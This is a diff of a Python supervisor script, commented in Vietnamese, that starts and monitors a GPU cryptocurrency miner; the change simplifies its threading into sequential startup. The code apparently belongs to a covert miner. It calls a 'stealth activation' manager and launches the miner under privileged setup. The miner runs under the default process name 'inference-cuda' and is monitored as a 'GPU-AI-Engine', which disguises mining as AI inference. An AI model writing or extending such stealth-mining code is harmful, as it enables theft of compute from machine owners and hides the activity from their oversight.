@@ -12,8 +12,8 @@ import signal
 import time
 import re
 import logging
-import json  # ✅ [JSON] (JavaScript Object Notation – định dạng dữ liệu cấu hình)
-import select  # ✅ [select] (thư viện chọn I/O đa kênh – non-blocking)
+import json
+import select
 from pathlib import Path
 from datetime import datetime
 
@@ -40,7 +40,6 @@ from mining_environment.stealth.core.stealth_activation_manager import initializ
 from pid_logger import start_worker, log_pid, register_process
 
 
-# Performance tracking removed - simplified mining operations
 
 
 
@@ -78,7 +77,6 @@ stop_event = threading.Event()
 
 # **Lock-Free Process Manager** (Trình quản lý tiến trình không khóa)
 import weakref
-import queue
 
 class LockFreeProcessManager:
     """**Lock-Free Process Manager** sử dụng **atomic operations** (thao tác nguyên tử)"""
@@ -111,11 +109,7 @@ gpu_process = None  # Compatibility
 # Thêm biến privileged_manager_global để chia sẻ kết quả thiết lập môi trường giữa các luồng
 privileged_manager_global = None
 
-# Bổ sung các biến Event toàn cục cho giao tiếp thread nội bộ
-env_setup_complete_event = threading.Event()
-env_setup_failed_event = threading.Event()
-resource_manager_failed_event = threading.Event()
-shutdown_initiated_event = threading.Event()
+# **SIMPLIFIED**: Remove unused threading events - sequential execution only
 
 def signal_handler(signum, frame):
     logger.info(f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác...")
@@ -165,101 +159,9 @@ def initialize_environment():
         stop_event.set()
         raise RuntimeError(error_msg) from e
         
-def start_resource_manager():
-    """
-    **DEPRECATED**: **Direct ResourceManager startup** (khởi động ResourceManager trực tiếp) - 
-    **Replaced by resource_manager_thread()** (thay thế bằng resource_manager_thread())
-    
-    Note: Hàm này giữ lại để **backward compatibility** (tương thích ngược)
-    """
-    logger.warning("⚠️ start_resource_manager() is deprecated - use resource_manager_thread() instead")
-    return None
-    
-    def resource_manager_worker():
-        """
-        **Worker function** (hàm công việc) chạy ResourceManager trực tiếp trong **separate thread** (luồng riêng biệt).
-        """
-        try:
-            # **Step 1**: Load configuration từ JSON
-            logger.info("📋 Step 1/4: Loading configuration from JSON...")
-            config_path = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config')) / "resource_config.json"
-            
-            if not config_path.exists():
-                raise FileNotFoundError(f"Configuration file not found: {config_path}")
-                
-            with open(config_path, 'r') as f:
-                config_data = json.loads(f.read())
-            
-            config = ConfigModel(**config_data)
-            logger.info("✅ Configuration loaded successfully")
-            
-            # **Step 2**: Initialize stealth activation system (EventBus replaced with DirectPIDRegistry)
-            logger.info("📋 Step 2/5: Initializing stealth activation system...")
-            # Note: EventBus completely removed - using DirectPIDRegistry for process communication
-            
-            # **Step 2.5**: Initialize Stealth Activation Manager (no EventBus needed)
-            logger.info("📋 Step 2.5/5: Initializing Stealth Activation Manager...")
-            stealth_init_success = initialize_stealth_activation(None)  # No event bus needed
-            if stealth_init_success:
-                logger.info("✅ Stealth Activation Manager initialized successfully")
-            else:
-                logger.warning("⚠️ Stealth Activation Manager initialization failed - continuing without external stealth")
-            
-            # **Step 3**: Create ResourceManager instance
-            logger.info("📋 Step 3/5: Creating ResourceManager instance...")
-            resource_manager = ResourceManager(config, None, logger)  # No event bus needed
-            logger.info("✅ ResourceManager instance created")
-            
-            # **Step 4**: Start ResourceManager
-            logger.info("📋 Step 4/5: Starting ResourceManager...")
-            resource_manager.start()
-            logger.info("🎯 ResourceManager đã được khởi động thành công")
-            
-        except Exception as e:
-            error_msg = f"❌ Lỗi khi khởi động ResourceManager: {e}"
-            logger.error(error_msg)
-            logger.error(f"🔍 Exception details: {str(e)}")
-            stop_event.set()
-    
-    # Tạo **background thread** (luồng nền) cho ResourceManager
-    resource_thread = threading.Thread(
-        target=resource_manager_worker,
-        daemon=True,  # **Daemon thread** (luồng nền) sẽ tự động kết thúc khi main program kết thúc
-        name="ResourceManagerThread"
-    )
-    
-    # Khởi động **thread** (luồng) và **không chờ** nó hoàn thành (**non-blocking**)
-    resource_thread.start()
-    logger.info(f"✅ ResourceManager thread đã được khởi động (Thread ID: {resource_thread.ident})")
-    
-    # **Enhanced verification** (xác minh nâng cao) với **timeout protection** (bảo vệ timeout)
-    verification_timeout = 5  # 5 giây thay vì 1 giây
-    for i in range(verification_timeout):
-        time.sleep(1)
-        if resource_thread.is_alive():
-            logger.debug(f"🔍 ResourceManager thread verification: alive ({i+1}/{verification_timeout}s)")
-        else:
-            logger.warning(f"⚠️ ResourceManager thread đã dừng sau {i+1}s")
-            stop_event.set()
-            break
-    
-    if resource_thread.is_alive():
-        logger.info("🎯 ResourceManager thread đang chạy bình thường - Main thread có thể tiếp tục")
-    else:
-        logger.warning("⚠️ ResourceManager thread đã dừng ngay sau khi khởi động")
-        stop_event.set()
-    
-    return resource_thread
+# **DEPRECATED FUNCTION REMOVED** - start_resource_manager() replaced by resource_manager_thread()
 
-def stop_resource_manager():
-    """
-    **DEPRECATED**: **Stop ResourceManager** (dừng ResourceManager) - 
-    **Replaced by thread-based cleanup** (thay thế bằng dọn dẹp dựa trên luồng)
-    
-    Note: ResourceManager shutdown is now handled by thread termination
-    """
-    logger.warning("⚠️ stop_resource_manager() is deprecated - shutdown handled by thread cleanup")
-    stop_event.set()
+# **DEPRECATED FUNCTION REMOVED** - stop_resource_manager() replaced by thread cleanup
 
 def is_mining_process_running(process):
     """
@@ -440,7 +342,6 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
                                           f"Runtime={runtime:.0f}s\033[0m")
                             print(metrics_line, flush=True)
                         
-                        # Hash rate logging removed - simplified monitoring
                     
                     # **Status indicators** (chỉ báo trạng thái hoạt động) mỗi 100 dòng
                     if line_count % 100 == 0:
@@ -651,7 +552,6 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
                 logger.info(startup_msg)
                 print(f"\033[92m{startup_msg}\033[0m", flush=True)  # Green startup message
                 
-                # Process registration removed - simplified process management
                 
                 # Enhanced PID Logger: Detect Real Mining PID (for stealth wrapper case)
                 try:
@@ -830,7 +730,6 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
                 log_thread.start()
                 logger.info(f"🚀 [Mining Log] Dual logging thread started for {process_name}")
                 
-                # Performance monitoring removed - simplified log monitoring
                 
                 time.sleep(2)
                 if process.poll() is not None:
@@ -870,168 +769,9 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
     stop_event.set()
     return None
 
-def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
-    """
-    **DEPRECATED**: Quản lý **lifecycle** (vòng đời) của **GPU miner** (máy khai thác GPU) - 
-    **Replaced by gpu_mining_thread()** (thay thế bằng gpu_mining_thread())
-    
-    Note: Hàm này giữ lại để **backward compatibility** (tương thích ngược)
-    """
-    logger.warning("⚠️ manage_gpu_miner() is deprecated - use gpu_mining_thread() instead")
-    return
-    
-    # **Enhanced initial logging** (ghi log ban đầu nâng cao)
-    gpu_miner_logger.info("===== GPU MINER LIFECYCLE STARTED =====")
-    gpu_miner_logger.info(f"Manager PID: {os.getpid()}")
-    gpu_miner_logger.info(f"Thread ID: {threading.current_thread().ident}")
-    gpu_miner_logger.info(f"Max Retries: {max_retries}")
-    gpu_miner_logger.info("=========================================")
-    
-    # **Notify main logger** (thông báo logger chính)
-    logger.info("✅ GPU Miner Manager initialized with dedicated logging")
-    
-    # **Enhanced mining loop** (vòng lặp khai thác nâng cao)
-    gpu_miner_logger.info("🔄 Starting GPU mining supervision loop...")
-    gpu_miner_logger.info(f"🔍 GPU Manager - Initial state: stop_event={stop_event.is_set()}, retries={retries}, max_retries={max_retries}")
-    while not stop_event.is_set() and retries < max_retries:
-        gpu_miner_logger.debug(f"🔄 GPU supervision cycle - stop_event={stop_event.is_set()}, retries={retries}")
-        # **Direct access** (truy cập trực tiếp) để **avoid deadlock** (tránh khóa chết)
-        process = gpu_process
-        gpu_miner_logger.debug(f"🔍 Checking GPU process status: {process}")
-        is_running = is_mining_process_running(process)
-        gpu_miner_logger.debug(f"📊 GPU process running status: {is_running}")
-        
-        if not is_running:
-            if process:
-                gpu_miner_logger.warning("🔄 GPU miner stopped - attempting restart")
-                logger.warning("Phát hiện GPU miner đã dừng. Thử khởi động lại...")
-                retries += 1
-            
-            gpu_miner_logger.info(f"🚀 Starting GPU mining process (attempt {retries + 1}/{max_retries})")
-            new_process = start_gpu_mining_process(privileged_manager=privileged_mgr)
-            gpu_process = new_process
-            
-            if gpu_process and is_mining_process_running(gpu_process):
-                gpu_miner_logger.info(f"✅ GPU miner started successfully - PID: {gpu_process.pid}")
-                retries = 0  # Reset retries on successful start
-            else:
-                gpu_miner_logger.error(f"❌ GPU miner startup failed - attempt {retries}/{max_retries}")
-        else:
-            # **Process running - log status** (tiến trình đang chạy - ghi log trạng thái)
-            gpu_miner_logger.debug(f"📊 GPU miner running normally - PID: {gpu_process.pid if gpu_process else 'Unknown'}")
-            
-            # Resource usage logging removed - simplified monitoring
-        
-        gpu_miner_logger.debug("⏳ Waiting 15s before next supervision cycle")
-        time.sleep(15)
-        
-    if retries >= max_retries:
-        gpu_miner_logger.error(f"🚨 GPU miner failed {max_retries} times - stopping supervision")
-        logger.error("GPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
-        stop_event.set()
-    
-    gpu_miner_logger.info("===== GPU MINER LIFECYCLE ENDED =====")
+# **DEPRECATED FUNCTION REMOVED** - manage_gpu_miner() replaced by direct GPU process startup
 
-def gpu_mining_thread():
-    """**Thread 3: GPU Mining** (Luồng 3: Khai thác GPU) với **Progressive GPU Activation** (kích hoạt GPU tuần tự) và **DirectPIDRegistry integration** (tích hợp DirectPIDRegistry)"""
-    global gpu_process
-    # 🔧 FIX: Sử dụng gpu_miner_logger thay vì tạo thread_logger riêng
-    thread_logger = gpu_miner_logger
-    thread_logger.info("🎮 GPU Mining Thread Started")
-    
-    # 🚀 Progressive GPU Activation - Auto-detect GPU count và staged initialization
-    gpu_count = 0
-    try:
-        import subprocess
-        result = subprocess.run(['nvidia-smi', '--list-gpus'], capture_output=True, text=True)
-        gpu_count = len([line for line in result.stdout.strip().split('\n') if line.strip()])
-        thread_logger.info(f"🔍 [PROGRESSIVE-GPU] Auto-detected {gpu_count} GPUs")
-    except Exception as e:
-        thread_logger.warning(f"⚠️ [PROGRESSIVE-GPU] GPU detection failed: {e}, assuming 2 GPUs")
-        gpu_count = 2
-    
-    # Calculate staged activation delay (5s per GPU to prevent memory spike)
-    activation_delay = min(5 * gpu_count, 30)  # Max 30s delay
-    thread_logger.info(f"🕰️ [PROGRESSIVE-GPU] Using {activation_delay}s staged activation delay")
-    
-    # 🗑️ EventBus completely removed - using DirectPIDRegistry for process communication
-    max_retries = 5
-    retries = 0
-    
-    # Môi trường đã được thiết lập đồng bộ trong main(); lấy privileged_manager_global
-    global privileged_manager_global
-    privileged_manager = privileged_manager_global
-    thread_logger.info(f"🔍 GPU Thread - privileged_manager_global status: {privileged_manager_global is not None}")
-    if privileged_manager is None:
-        thread_logger.error("❌ Environment chưa sẵn sàng - dừng GPU mining thread")
-        return  # GPU optional, không set stop_event
-    
-    # **GPU Mining Loop** (vòng lặp khai thác GPU) với **PID tracking** (theo dõi PID)
-    while not stop_event.is_set() and retries < max_retries:
-        try:
-            process = gpu_process  # Direct access to avoid deadlock
-            is_running = is_mining_process_running(process)
-            thread_logger.debug(f"[TRACE] is_mining_process_running={is_running}, PID={getattr(process,'pid',None)}")
-            if not is_running:
-                thread_logger.info(f"🔄 Starting GPU mining process (attempt {retries + 1}/{max_retries})")
-                
-                # 🚀 Progressive GPU Activation: Staged initialization
-                if retries == 0:  # First attempt
-                    thread_logger.info(f"🚀 [PROGRESSIVE-GPU] Stage 1: Memory pre-allocation...")
-                    time.sleep(2)  # Allow memory cleanup
-                    
-                    thread_logger.info(f"🚀 [PROGRESSIVE-GPU] Stage 2: GPU context initialization...")
-                    time.sleep(activation_delay)  # Staged delay based on GPU count
-                    
-                    thread_logger.info(f"🚀 [PROGRESSIVE-GPU] Stage 3: Mining process launch...")
-                
-                new_process = start_gpu_mining_process(privileged_manager=privileged_manager)
-                gpu_process = new_process
-                process_manager.set_gpu_process(new_process)  # **Lock-free update**
-                thread_logger.info(f"🔍 [DEBUG] start_mining_process returned: {gpu_process} (type: {type(gpu_process)})")
-                if gpu_process:
-                    thread_logger.info(f"🔍 [DEBUG] GPU process received successfully - PID: {gpu_process.pid}")
-                    # Enhanced PID Logger: register_process đã được gọi trong start_mining_process  
-                    thread_logger.info(f"✅ GPU process PID {gpu_process.pid} registered for enhanced monitoring")
-                else:
-                    thread_logger.error(f"🔍 [DEBUG] GPU process is None - start_mining_process failed")
-                
-                if gpu_process:
-                    try:
-                        log_file_path = f"/app/mining_environment/logs/{os.getenv('GPU_PROCESS_NAME', 'inference-cuda')}_output.log"
-                        gpu_log_file = open(log_file_path, 'ab')  # Open file handle for monitor thread
-                        monitor_thread = threading.Thread(
-                            target=monitor_process_output,
-                            args=(gpu_process, "GPU-AI-Engine", gpu_log_file, thread_logger),
-                            daemon=True,
-                            name=f"GPUMonitor-{gpu_process.pid}"
-                        )
-                        monitor_thread.start()
-                        thread_logger.info(f"📊 Started GPU output monitoring thread (ID: {monitor_thread.ident})")
-                    except Exception as monitor_err:
-                        thread_logger.error(f"❌ Failed to start GPU output monitoring: {monitor_err}")
-                    
-                    thread_logger.info(f"✅ GPU miner started - PID: {gpu_process.pid}")
-                    retries = 0  # Reset on success
-                else:
-                    retries += 1
-                    thread_logger.error(f"❌ GPU mining startup failed (attempt {retries}/{max_retries})")
-            else:
-                # **Process running - periodic PID update** (tiến trình đang chạy - cập nhật PID định kỳ)
-                # DirectPIDRegistry handles all process communication - no EventBus needed
-                thread_logger.debug("GPU miner healthy heartbeat")
-                
-        except Exception as e:
-            thread_logger.error(f"❌ GPU Mining Thread error: {e}")
-            retries += 1
-        
-        # **Shorter supervision interval for GPU** (khoảng thời gian giám sát ngắn hơn cho GPU)
-        time.sleep(15)
-    
-    if retries >= max_retries:
-        thread_logger.error(f"🚨 GPU mining failed {max_retries} times - stopping thread")
-    
-    thread_logger.info("🔚 GPU Mining Thread ended")
+# **DEPRECATED FUNCTION REMOVED** - gpu_mining_thread() replaced by direct GPU process startup in main()
 
 def resource_manager_thread():
     thread_logger = setup_logging('resource_manager_thread', str(Path(LOGS_DIR) / 'resource_manager_thread.log'), 'INFO')
@@ -1063,311 +803,155 @@ def resource_manager_thread():
         thread_logger.info("🎯 ResourceManager started successfully")
     except Exception as e:
         thread_logger.error(f"❌ Resource Manager Thread failed: {e}")
-        resource_manager_failed_event.set()
+        # resource_manager_failed_event removed - using stop_event only
         stop_event.set()
     thread_logger.info("🔚 Resource Manager Thread ended")
 
-def environment_setup_thread():
-    """**Thread 1: Environment Setup** (Luồng 1: Thiết lập môi trường) với **thread-safe operations** (thao tác an toàn luồng)"""
-    global privileged_manager_global
-    thread_logger = setup_logging('env_setup_thread', str(Path(LOGS_DIR) / 'env_setup_thread.log'), 'INFO')
-    thread_logger.info("🌍 Environment Setup Thread Started")
-    try:
-        thread_logger.info("🔧 Starting environment initialization...")
-        privileged_manager = initialize_environment()
-        privileged_manager_global = privileged_manager  # ✅ FIX: Assign to global variable
-        thread_logger.info(f"🔧 Environment setup completed - privileged_manager_global assigned: {privileged_manager_global is not None}")
-        env_setup_complete_event.set()
-        thread_logger.info("✅ Environment Setup Thread completed successfully")
-        return privileged_manager
-    except Exception as e:
-        thread_logger.error(f"❌ Environment Setup Thread failed: {e}")
-        env_setup_failed_event.set()
-        stop_event.set()
-        return None
+# **DEPRECATED FUNCTION REMOVED** - environment_setup_thread() replaced by direct setup in main()
 
 def main():
-    """**Multi-Threading Architecture Main Function** (hàm chính kiến trúc đa luồng) với **DirectPIDRegistry coordination** (phối hợp DirectPIDRegistry)"""
-    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử (Multi-Threading Architecture) =====")
+    """**Simplified Sequential Architecture Main Function** (hàm chính kiến trúc tuần tự đơn giản) với **DirectPIDRegistry coordination** (phối hợp DirectPIDRegistry)"""
+    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử (Simplified Sequential Architecture) =====")
     
     # ------------------------------------------------------------------
-    # 1️⃣ Thiết lập môi trường đồng bộ (DirectPIDRegistry replaces EventBus)
+    # 1️⃣ **SIMPLIFIED**: Thiết lập môi trường tuần tự trực tiếp (DirectPIDRegistry replaces EventBus)
     # ------------------------------------------------------------------
     global privileged_manager_global
     try:
-        logger.info("🔧 Đang thiết lập môi trường (synchronous)...")
-        env_thread = threading.Thread(target=environment_setup_thread)
-        env_thread.start()
-        # Chờ environment setup hoàn thành hoặc thất bại
-        while not (env_setup_complete_event.is_set() or env_setup_failed_event.is_set()):
-            time.sleep(0.1)
-        if env_setup_failed_event.is_set():
-            logger.error("❌ Không thể thiết lập môi trường.")
-            return
-        # ✅ FIX: Remove incorrect assignment - privileged_manager_global already set in thread
+        logger.info("🔧 Đang thiết lập môi trường (sequential direct)...")
+        privileged_manager_global = initialize_environment()
         logger.info("✅ Thiết lập môi trường hoàn tất")
     except Exception as e:
         logger.error(f"❌ Không thể thiết lập môi trường: {e}")
         return  # Abort startup nếu môi trường lỗi
 
     # ------------------------------------------------------------------
-    # 2️⃣ Khởi tạo DirectPIDRegistry cho giao tiếp PID / ResourceManager
+    # 2️⃣ **SIMPLIFIED**: Khởi tạo DirectPIDRegistry tuần tự đơn giản
     # ------------------------------------------------------------------
-    # 🚀 Khởi động PID Logger worker với error handling và verification
+    # 🚀 Khởi động PID Logger worker đơn giản
     try:
-        from pid_logger import _WORKER_STARTED
         start_worker()
-        # Verify worker đã khởi chạy thành công
-        for i in range(5):  # Retry 5 lần, mỗi lần 0.5s
-            if _WORKER_STARTED.is_set():
-                logger.info("🚀 PID Logger worker started successfully")
-                break
-            time.sleep(0.5)
-            logger.info(f"⏳ Waiting for PID Logger worker to start... (attempt {i+1}/5)")
-        else:
-            logger.error("❌ PID Logger worker failed to start after 5 attempts")
-            # Force restart worker
-            from pid_logger import force_restart_worker
-            force_restart_worker()
-            logger.info("🔄 Force restarted PID Logger worker")
+        time.sleep(2)  # Đợi worker khởi động đơn giản
+        logger.info("🚀 PID Logger worker started (simplified)")
     except Exception as e:
         logger.error(f"❌ Failed to start PID Logger worker: {e}")
-        # Fallback: try to start worker again
-        try:
-            start_worker()
-            logger.info("🔄 Fallback PID Logger worker started")
-        except Exception as e2:
-            logger.error(f"❌ Fallback PID Logger worker also failed: {e2}")
+        # Tiếp tục chạy mà không dừng hệ thống
 
-    # 🤖 Auto PID Registration Thread - DirectPIDRegistry Pure Mechanism
-    def auto_pid_registration_thread():
-        """
-        **DirectPIDRegistry Pure Mechanism** (cơ chế DirectPIDRegistry thuần túy)
-        Luồng chỉ giám sát **registry events** (sự kiện sổ đăng ký) từ DirectPIDRegistry 
-        mà không thực hiện **process name recognition** (nhận biết tên tiến trình)
-        """
-        import time as time_module
-        from pid_logger import _PROCESS_REGISTRY, debug_registry_status
-        
-        logger.info("🤖 Auto PID Registration Thread started - DirectPIDRegistry Pure Mode")
-        logger.info("📋 Mode: Registry monitoring only, no process name detection")
-        
-        # **Registry Monitoring Variables** (biến giám sát sổ đăng ký)
-        last_registry_size = 0
-        monitoring_cycle = 0
-        
-        while True:
-            try:
-                monitoring_cycle += 1
-                
-                # **DirectPIDRegistry Status Monitoring** (giám sát trạng thái DirectPIDRegistry)
-                current_registry_size = len(_PROCESS_REGISTRY)
-                
-                # **Registry Change Detection** (phát hiện thay đổi sổ đăng ký)
-                if current_registry_size != last_registry_size:
-                    registry_change = current_registry_size - last_registry_size
-                    change_type = "increased" if registry_change > 0 else "decreased"
-                    
-                    logger.info(f"🔄 DirectPIDRegistry {change_type}: {abs(registry_change)} process(es)")
-                    logger.info(f"📊 Current registry size: {current_registry_size} processes")
-                    
-                    # **Log Registry Contents** (ghi log nội dung sổ đăng ký) - without process name filtering
-                    for pid, process_info in _PROCESS_REGISTRY.items():
-                        process_status = "running" if hasattr(process_info.get('process'), 'is_running') and process_info['process'].is_running() else "unknown"
-                        logger.info(f"📋 Registry: PID={pid}, Type={process_info.get('type', 'unknown')}, Status={process_status}")
-                    
-                    last_registry_size = current_registry_size
-                
-                # **Periodic Registry Health Check** (kiểm tra sức khỏe sổ đăng ký định kỳ)
-                if monitoring_cycle % 6 == 0:  # Every 30 seconds (6 cycles * 5s)
-                    logger.info(f"🔍 Registry Health Check (Cycle {monitoring_cycle})")
-                    logger.info(f"📊 Active processes in registry: {current_registry_size}")
-                    
-                    # **Enhanced Debug Information** (thông tin gỡ lỗi nâng cao)
-                    debug_registry_status()
-                    
-                    # **Registry Cleanup Check** (kiểm tra dọn dẹp sổ đăng ký)
-                    dead_pids = []
-                    for pid, process_info in _PROCESS_REGISTRY.items():
-                        try:
-                            process_obj = process_info.get('process')
-                            if process_obj and hasattr(process_obj, 'is_running'):
-                                if not process_obj.is_running():
-                                    dead_pids.append(pid)
-                        except Exception:
-                            dead_pids.append(pid)
-                    
-                    if dead_pids:
-                        logger.info(f"🧹 Found {len(dead_pids)} dead processes in registry: {dead_pids}")
-                        # Note: Cleanup sẽ được thực hiện bởi DirectPIDRegistry internal mechanism
-                
-                # **Non-Intrusive Monitoring Interval** (khoảng thời gian giám sát không xâm phạm)
-                time_module.sleep(5)  # Registry monitoring every 5 seconds
-                
-            except Exception as e:
-                logger.error(f"🤖 Auto PID Registration Thread error: {e}")
-                time_module.sleep(10)  # Longer sleep on error
-    
-    # Thêm khai báo danh sách mining_threads
-    mining_threads = []
-    
-    # Thêm Auto PID Registration Thread
-    auto_pid_thread = threading.Thread(
-        target=auto_pid_registration_thread,
-        daemon=True,
-        name="AutoPIDRegistrationThread"
-    )
-    mining_threads.append(('Auto PID Registration', auto_pid_thread, True))
-
-    # (Đã bỏ EnvironmentSetupThread – môi trường thiết lập đồng bộ)
-
-    # **Thread 4: Resource Manager** (Luồng 4: Trình quản lý tài nguyên)
-    resource_thread = threading.Thread(
+    # ------------------------------------------------------------------
+    # 3️⃣ **SIMPLIFIED**: Khởi động Resource Manager tuần tự
+    # ------------------------------------------------------------------
+    logger.info("🔧 Starting Resource Manager (sequential)...")
+    resource_manager_thread = threading.Thread(
         target=resource_manager_thread,
         daemon=True,
         name="ResourceManagerThread"
     )
-    mining_threads.append(('Resource Manager', resource_thread, True))
-
-    # ✅ **CPU MINING PERMANENTLY REMOVED** - GPU-only mining operations
-
-    # **Thread 3: GPU Mining** (Luồng 3: Khai thác GPU)
-    gpu_thread = threading.Thread(
-        target=gpu_mining_thread,
-        daemon=True,
-        name="GPUMiningThread"
-    )
-    mining_threads.append(('GPU Mining', gpu_thread, True))
+    resource_manager_thread.start()
+    time.sleep(2)  # Đợi Resource Manager khởi động
+    logger.info("✅ Resource Manager started (background)")
     
-    def parallel_thread_startup(mining_threads):
-        """
-        **Parallel Thread Startup** (khởi động luồng song song) với 
-        **barrier synchronization** (đồng bộ hóa rào cản)
-        """
-        from concurrent.futures import ThreadPoolExecutor, as_completed
-        import threading
-        
-        # **Count enabled threads** (đếm luồng được kích hoạt)
-        enabled_threads = [(t_type, t, enabled) for t_type, t, enabled in mining_threads if enabled]
-        thread_count = len(enabled_threads)
-        
-        if thread_count == 0:
-            logger.warning("⚠️ No threads enabled for startup")
-            return []
-        
-        # **Barrier synchronization** (đồng bộ hóa rào cản)
-        startup_barrier = threading.Barrier(thread_count + 1)  # +1 for main thread
-        startup_results = {}
-        
-        def start_thread_with_barrier(thread_info):
-            """Start thread and wait at barrier"""
-            thread_type, thread, enabled = thread_info
-            try:
-                thread.start()
-                logger.info(f"🚀 {thread_type} Thread starting (ID: {thread.ident})")
-                startup_barrier.wait()  # **Wait for all threads**
-                return (thread_type, thread, "success")
-            except Exception as e:
-                logger.error(f"❌ {thread_type} Thread startup failed: {e}")
-                try:
-                    startup_barrier.wait()  # **Still participate in barrier**
-                except:
-                    pass
-                return (thread_type, None, f"error: {e}")
-        
-        logger.info(f"🚀 Starting {thread_count} threads in parallel...")
-        started_threads = []
-        
-        # **Parallel execution** (thực thi song song)
-        with ThreadPoolExecutor(max_workers=thread_count) as executor:
-            # Submit all thread startups
-            futures = {executor.submit(start_thread_with_barrier, info): info 
-                      for info in enabled_threads}
-            
-            # **Main thread joins barrier** (luồng chính tham gia rào cản)
-            startup_barrier.wait()
-            logger.info("✅ All threads synchronized at startup barrier")
-            
-            # **Collect results** (thu thập kết quả)
-            for future in as_completed(futures):
-                thread_type, thread, status = future.result()
-                if status == "success" and thread:
-                    started_threads.append((thread_type, thread))
-                    logger.info(f"✅ {thread_type} Thread ready")
-                elif "error:" in status:
-                    logger.error(f"❌ Failed to start {thread_type} Thread: {status}")
-        
-        return started_threads
+    # ------------------------------------------------------------------
+    # 4️⃣ **SIMPLIFIED**: Khởi động GPU Mining process trực tiếp
+    # ------------------------------------------------------------------
+    global gpu_process
+    logger.info("🎮 Starting GPU Mining process (sequential direct)...")
+    gpu_process = start_gpu_mining_process(privileged_manager=privileged_manager_global)
     
-    # **Execute parallel startup** (thực thi khởi động song song)
-    started_threads = parallel_thread_startup(mining_threads)
-    
-    # **Fast Thread Health Verification** (Xác minh sức khỏe luồng nhanh)
-    logger.info("🔍 Verifying threads health...")
-    time.sleep(1)  # **Reduced from 5s to 1s** (giảm từ 5s xuống 1s)
-    
-    # **GPU-Only DirectPIDRegistry Status** (trạng thái DirectPIDRegistry GPU duy nhất)
-    thread_status = {
-        'gpu_pid_registered': False
-    }
-    
-    active_count = sum(1 for _, thread in started_threads if thread.is_alive())
-    logger.info(f"🎯 Active threads: {active_count}/{len(started_threads)}")
-    
-    if active_count > 0:
-        logger.info("🚀 MULTI-THREADING ARCHITECTURE STARTUP COMPLETED")
-    else:
-        logger.error("❌ No threads are running - check configuration and logs")
+    if not gpu_process or not is_mining_process_running(gpu_process):
+        logger.error("❌ Không thể khởi động GPU mining process")
         stop_event.set()
         return
     
-    # Performance monitoring removed - simplified thread management
-    
-    # **Thread monitoring loop** (vòng lặp giám sát luồng) với **DirectPIDRegistry coordination** (phối hợp DirectPIDRegistry)
-    try:
-        monitoring_interval = 30  # seconds
+    logger.info(f"✅ GPU Mining process started - PID: {gpu_process.pid}")
+    process_manager.set_gpu_process(gpu_process)  # Cập nhật lock-free manager
+    # ------------------------------------------------------------------
+    # 5️⃣ **SIMPLIFIED**: Khởi động Simple Registry Monitoring
+    # ------------------------------------------------------------------
+    def simple_registry_monitor():
+        """**Simplified registry monitoring** (giám sát sổ đăng ký đơn giản)"""
+        from pid_logger import _PROCESS_REGISTRY
+        logger.info("📋 Simple registry monitoring started")
+        
         while not stop_event.is_set():
-            # **Thread health check** (kiểm tra sức khỏe luồng)
-            for thread_name, thread in started_threads:
-                if not thread.is_alive():
-                    logger.warning(f"⚠️ {thread_name} thread has stopped")
-                    
-                    # 🗑️ **REMOVED**: EventBus notifications replaced by DirectPIDRegistry
-                    logger.info(f"⚠️ {thread_name} thread has stopped - using DirectPIDRegistry for notifications")
+            try:
+                registry_size = len(_PROCESS_REGISTRY)
+                if registry_size > 0:
+                    logger.debug(f"📊 Registry: {registry_size} processes")
+                time.sleep(30)  # Kiểm tra mỗi 30 giây
+            except Exception as e:
+                logger.error(f"Registry monitor error: {e}")
+                time.sleep(60)
+    
+    # Khởi động Simple Registry Monitor trong background
+    registry_monitor_thread = threading.Thread(
+        target=simple_registry_monitor,
+        daemon=True,
+        name="SimpleRegistryMonitor"
+    )
+    registry_monitor_thread.start()
+    logger.info("✅ Simple Registry Monitor started")
+    
+    # **SIMPLIFIED STARTUP COMPLETED** (hoàn thành khởi động đơn giản)
+    logger.info("🚀 SIMPLIFIED SEQUENTIAL ARCHITECTURE STARTUP COMPLETED")
+    
+    # Kiểm tra các thành phần đã khởi động
+    background_threads = [
+        ("Resource Manager", resource_manager_thread),
+        ("Registry Monitor", registry_monitor_thread)
+    ]
+    
+    active_count = sum(1 for _, thread in background_threads if thread.is_alive())
+    logger.info(f"🎯 Background threads: {active_count}/{len(background_threads)}")
+    logger.info(f"🎮 GPU Process: {'Running' if is_mining_process_running(gpu_process) else 'Stopped'}")
+    
+    if not is_mining_process_running(gpu_process):
+        logger.error("❌ GPU process not running - system failure")
+        stop_event.set()
+        return
+    
+    # ------------------------------------------------------------------
+    # 6️⃣ **SIMPLIFIED**: Main monitoring loop đơn giản
+    # ------------------------------------------------------------------
+    logger.info("🔍 Starting simplified monitoring loop...")
+    
+    try:
+        while not stop_event.is_set():
+            # **Simple GPU process health check** (kiểm tra sức khỏe GPU đơn giản)
+            if not is_mining_process_running(gpu_process):
+                logger.error("❌ GPU mining process stopped! Terminating system.")
+                print(f"\033[91m❌ GPU MINING PROCESS STOPPED!\033[0m", flush=True)
+                stop_event.set()
+                break
             
-            # **Lock-Free GPU process health check** (kiểm tra sức khỏe GPU không khóa)
-            gpu_alive, current_process = process_manager.get_gpu_process_status()
+            # **Simple background thread check** (kiểm tra background thread đơn giản)
+            dead_threads = [name for name, thread in background_threads if not thread.is_alive()]
+            if dead_threads:
+                logger.warning(f"⚠️ Background threads stopped: {dead_threads}")
             
-            if not gpu_alive:
-                logger.warning("⚠️ GPU mining process stopped!")
-                print(f"\033[91m⚠️ GPU MINING PROCESS STOPPED!\033[0m", flush=True)
+            # **Simple health log** (log sức khỏe đơn giản)
+            logger.info(f"✅ System healthy - GPU PID: {gpu_process.pid if gpu_process else 'N/A'}")
             
-            # **System health check** (kiểm tra sức khỏe hệ thống) - using DirectPIDRegistry
-            logger.info(f"🔍 System health: {sum(1 for _, thread in started_threads if thread.is_alive())}/{len(started_threads)} threads alive, GPU alive: {gpu_alive}")
-            
-            time.sleep(monitoring_interval)
+            time.sleep(30)  # Monitor every 30 seconds
             
     except KeyboardInterrupt:
